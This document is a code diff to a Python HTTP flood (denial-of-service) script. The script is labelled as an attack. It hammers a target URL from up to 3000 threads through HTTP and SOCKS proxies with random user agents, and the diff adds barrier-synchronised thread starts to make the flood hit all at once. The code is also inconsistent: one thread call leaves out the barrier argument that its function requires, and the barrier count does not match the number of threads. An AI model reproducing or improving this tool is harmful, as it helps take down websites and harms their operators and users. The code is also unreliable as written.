@@ -46,6 +46,15 @@ with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxysocks")
 
+def dospause1(barrier, url):
+    barrier.wait()
+    threading.Thread(target=dos1_1, args=(url,)).start()
+    threading.Thread(target=dos1_2, args=(url,)).start()
+
+def dospause2(barrier, url):
+    barrier.wait()
+    dos2(url)
+
 # Аттака
 def dos1_1(target):
     while True:
@@ -53,7 +62,7 @@ def dos1_1(target):
         header = {'accept': '*/*', 'user-agent': useragent}
 
         useragent2 = random.choice(headersp)
-        header2 = {'accept': '*/*', 'user-agent': useragent2}
+        header2 = {'accept': '*/*', 'user-agent': useragent}
 
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
@@ -84,7 +93,7 @@ def dos1_2(target):
         header = {'accept': '*/*', 'user-agent': useragent}
 
         useragent2 = random.choice(headersp)
-        header2 = {'accept': '*/*', 'user-agent': useragent2}
+        header2 = {'accept': '*/*', 'user-agent': useragent}
 
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
@@ -144,17 +153,18 @@ except ValueError:
 if threads == 0 or threads > 3000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
+bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
 if proxyuseage == 1:
     for i in prange(0, threads):
-        threading.Thread(target=dos1_1, args=(url,)).start()
-        threading.Thread(target=dos1_2, args=(url,)).start()
+        threading.Thread(target=dospause1, args=(bar, url,)).start()
+        threading.Thread(target=dospause1, args=(bar, url,)).start()
 else:
     for i in prange(0, threads):
-        thr2 = threading.Thread(target=dospause2, args=(bar, url,))
+        thr2 = threading.Thread(target=dospause2, args=(url,))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
 print(Style.RESET_ALL)
